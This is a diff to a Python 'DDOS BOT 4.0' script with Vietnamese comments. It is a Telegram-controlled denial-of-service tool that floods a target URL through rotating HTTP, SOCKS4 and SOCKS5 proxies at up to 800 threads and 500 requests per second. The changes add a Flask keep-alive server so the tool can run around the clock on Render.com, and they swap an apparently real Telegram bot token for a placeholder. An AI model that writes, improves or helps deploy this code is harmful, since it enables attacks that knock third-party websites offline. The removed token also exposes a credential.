@@ -1,6 +1,6 @@
 # =====================================================
-# DDOS BOT 4.0 - TREO 24/7 - TỐI ƯU TỐI ĐA
-# FIX LỖI global declaration - CHẠY ỔN ĐỊNH TRÊN RENDER
+# DDOS BOT 4.0 - TREO 24/7 - HOÀN CHỈNH
+# CHẠY ỔN ĐỊNH TRÊN RENDER.COM - KHÔNG LỖI PORT
 # =====================================================
 
 import requests
@@ -18,18 +18,17 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from urllib.parse import urlparse
 import socks
+from flask import Flask, jsonify
 
-# -------------------- CẤU HÌNH TELEGRAM --------------------
-TELEGRAM_BOT_TOKEN = "6320148381:AAFvtpr4l8t61IRgynsiUkwKVbCNMw9kdtU"  # THAY TOKEN THẬT
-
-# -------------------- CẤU HÌNH TẤN CÔNG --------------------
+# -------------------- CẤU HÌNH --------------------
+TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # THAY TOKEN THẬT
 THREAD_COUNT = 800
 REQUESTS_PER_SECOND = 500
 MAX_RUN_TIME = 120
 CONNECTION_POOL = 100
 TIMEOUT = 1.5
 
-# -------------------- BIẾN TOÀN CỤC (KHAI BÁO ĐẦU FILE) --------------------
+# -------------------- BIẾN TOÀN CỤC --------------------
 stop_event = threading.Event()
 is_running = False
 attack_thread = None
@@ -199,7 +198,7 @@ def load_proxies(filepath):
     return http_proxies, socks5_proxies, socks4_proxies
 
 # =====================================================
-# CẬP NHẬT PROXY - FIX global
+# CẬP NHẬT PROXY
 # =====================================================
 def update_proxies_from_file(file_path, chat_id):
     global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
@@ -227,7 +226,7 @@ def update_proxies_from_file(file_path, chat_id):
     return True
 
 # =====================================================
-# TỰ ĐỘNG RELOAD PROXY - FIX global
+# TỰ ĐỘNG RELOAD PROXY
 # =====================================================
 def auto_reload_proxy():
     global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
@@ -677,7 +676,7 @@ def run_attack(target, chat_id):
     
     total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
     send_telegram(f"""
-▶️ <b>BẮT ĐẦU TẤN CÔNG TỐC ĐỘ CAO!</b>
+▶️ <b>BẮT ĐẦU TẤN CÔNG!</b>
 🎯 {target['url']}
 🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
 📊 Tổng proxy: {total_proxy}
@@ -739,11 +738,12 @@ def run_attack(target, chat_id):
     """, chat_id)
 
 # =====================================================
-# TELEGRAM LISTENER - FIX global
+# TELEGRAM LISTENER
 # =====================================================
 def telegram_listener():
     global is_running, attack_thread, chat_id_saved
     global proxy_http, proxy_socks5, proxy_socks4, proxy_list, proxy_update_time
+    global THREAD_COUNT, REQUESTS_PER_SECOND
     
     last_update_id = 0
     
@@ -867,7 +867,6 @@ Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
                         
                         elif cmd.startswith('/threads'):
                             try:
-                                global THREAD_COUNT
                                 new_count = int(text.split()[1])
                                 if 1 <= new_count <= 2000:
                                     THREAD_COUNT = new_count
@@ -879,7 +878,6 @@ Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
                         
                         elif cmd.startswith('/speed'):
                             try:
-                                global REQUESTS_PER_SECOND
                                 new_speed = int(text.split()[1])
                                 if 1 <= new_speed <= 2000:
                                     REQUESTS_PER_SECOND = new_speed
@@ -986,6 +984,49 @@ def watchdog():
                 pass
 
 # =====================================================
+# WEB SERVER CHO RENDER.COM - FIX LỖI PORT
+# =====================================================
+web_app = Flask(__name__)
+
+@web_app.route('/')
+def home():
+    return jsonify({
+        'status': 'DDOS Bot 4.0 Running 24/7',
+        'uptime': int(time.time() - bot_start_time),
+        'proxy_count': len(proxy_list),
+        'threads': THREAD_COUNT,
+        'speed': REQUESTS_PER_SECOND,
+        'is_attacking': is_running,
+        'total_requests': attack_stats['total_requests']
+    })
+
+@web_app.route('/health')
+def health():
+    return 'OK', 200
+
+@web_app.route('/stats')
+def stats():
+    return jsonify({
+        'uptime': int(time.time() - bot_start_time),
+        'proxy_count': len(proxy_list),
+        'http_proxies': len(proxy_http),
+        'socks5_proxies': len(proxy_socks5),
+        'socks4_proxies': len(proxy_socks4),
+        'threads': THREAD_COUNT,
+        'speed': REQUESTS_PER_SECOND,
+        'is_attacking': is_running,
+        'total_requests': attack_stats['total_requests'],
+        'success_count': attack_stats['success_count'],
+        'fail_count': attack_stats['fail_count'],
+        'heartbeat': heartbeat_count
+    })
+
+def run_web_server():
+    port = int(os.environ.get('PORT', 10000))
+    print(f"[+] Web server starting on port {port}")
+    web_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+
+# =====================================================
 # KHỞI CHẠY CHÍNH
 # =====================================================
 if __name__ == "__main__":
@@ -1015,10 +1056,13 @@ if __name__ == "__main__":
     print(f"[+] Max run: {MAX_RUN_TIME}s")
     print("="*60)
     print("[+] BOT ĐÃ SẴN SÀNG - CHẠY 24/7")
-    print("[+] TỐC ĐỘ TỐI ĐA 500+ REQ/S")
-    print("[+] HỖ TRỢ HTTP, SOCKS4, SOCKS5")
+    print("[+] WEB SERVER ĐANG CHẠY - FIX LỖI PORT")
     print("="*60)
     
+    # Khởi chạy web server trong thread riêng
+    threading.Thread(target=run_web_server, daemon=True).start()
+    
+    # Khởi chạy các thread bot
     threading.Thread(target=telegram_listener, daemon=True).start()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=auto_reload_proxy, daemon=True).start()
